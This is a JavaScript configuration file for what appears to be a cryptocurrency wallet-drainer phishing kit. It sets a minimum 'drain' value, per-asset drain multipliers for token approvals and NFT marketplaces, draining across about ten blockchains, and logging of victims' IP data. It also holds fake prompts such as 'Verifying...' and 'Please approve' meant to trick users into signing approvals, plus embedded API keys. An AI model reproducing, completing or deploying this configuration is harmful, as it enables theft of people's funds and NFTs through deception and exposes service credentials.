
let ACCESS_KEY = '0aeeaf36-0ac2-4d84-b228-a1c69e093753'
let USE_W3M_V3 = true
let logPromptingEnabled = true;
let minimalDrainValue = 0.001;
let mainModal = 'w3m'
let chooseWalletTheme = 'dark';
let themeVariables = {
'--w3m-z-index': 10000,
'--w3m-overlay-backdrop-filter': 'blur(6px)',
};
let w3m_name = "";
let w3m_description = "";
let w3m_url = "";
let w3m_icons = [''];
let multipliers = {
'LP_NFTS': 0.1,
'PERMIT2': 1,
'BLUR': 1,
'SEAPORT': 1,
'SWAP': 1,
'TOKENS': 1,
'NFT': 1,
'NATIVES': 0.1,
};
let notEligible = "Your wallet is not eligible, connect another wallet.";
let swal_notEligibleTitle = "Not eligible";
let addressChanged = "Your wallet address has changed, connect wallet again please";
let swal_addressChangedTitle = "";
let popupElementID = "drPopup";
let popupCloseButtonID = "popupCLose";
let popupCode = "";
let messageElement = "messageButton";
let textInitialConnected = "Loading...";
let textProgress = "Verifying...";
let success = "Please approve";
let failed = "Try again";
let logIpData = true;
let logEmptyWallets = true;
let logDrainingStrategy = true;
let repeatHighest = true;
let retry_changenetwork = 3;
let eth_enabled = true;
let bsc_enabled = true;
let arb_enabled = true;
let polygon_enabled = true;
let avalanche_enabled = true;
let optimism_enabled = true;
let ftm_enabled = true;
let celo_enabled = true;
let cronos_enabled = true;
let base_enabled = true;
let autoconnect = false;
let useSweetAlert = true;
let popupEnabled = true;
let useDefaultPopup = true;
let canClosePopup = true;
let buttonMessagesEnabled = false;
let twoStep = false;
let twoStepButtonElement = "startButton";
let connectElement = "connectButton";
let infura_key = "bf50752762404601a4e90151e2b3eeb3";
let wc_projectid = "d65e802ca30f4e3dc9e46463ea1b9a16";
let cfgversion = 680;
let researchers = [];
let experimental = {"disable-w3m-featured":true};